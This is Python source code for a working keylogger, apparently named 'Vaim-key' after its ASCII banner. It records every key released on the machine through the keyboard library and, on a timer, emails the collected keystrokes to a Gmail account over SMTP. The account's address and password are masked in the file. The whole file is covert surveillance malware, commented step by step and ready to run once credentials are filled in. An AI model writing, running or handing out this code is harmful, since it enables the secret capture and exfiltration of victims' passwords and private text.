import keyboard 
import smtplib 
from threading import Semaphore, Timer





"""



print("\n")
print("   ____   ____      .__                   __	\n")
print("   \   \ /   /____  |__| _____           |  | __ ____ ___.__.	\n")
print("    \   Y   /\__  \ |  |/     \   ______ |  |/ // __ <   |  |	\n")
print("     \     /  / __ \|  |  Y Y  \ /_____/ |    <\  ___/\___  |	\n")
print("      \___/  (____  /__|__|_|  /         |__|_ \\___  > ____|	\n")
print("                  \/         \/               \/    \/\/	\n")
print("\n")




SEND_REPORT_EVERY = int(input("[+] ENTER INTERVAL   >>> "))
EMAIL_ADDRESS = str(input("[+] ENTER YOUR EMAIL >>> "))
EMAIL_PASSWORD = str(input("[+] ENTER YOUR PASS  >>> "))
"""

SEND_REPORT_EVERY = 15
EMAIL_ADDRESS = "******@gmail.com"
EMAIL_PASSWORD = "*********************************"


class Keylogger:
    def __init__(self, interval):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        # for blocking after setting the on_release listener
        self.semaphore = Semaphore(0)

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"

        self.log += name
    
    def sendmail(self, email, password, message):
        # manages a connection to an SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to the email account
        server.login(email, password)
        # send the actual message
        server.sendmail(email, email, message)
        # terminates the session
        server.quit()

    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            # can print to a file, whatever you want
            # print(self.log)
        self.log = ""
        Timer(interval=self.interval, function=self.report).start()

    def start(self):
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread,
        # since on_release() doesn't block the current thread
        # if we don't block it, when we execute the program, nothing will happen
        # that is because on_release() will start the listener in a separate thread
        self.semaphore.acquire()

    
if __name__ == "__main__":
    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
    keylogger.start()
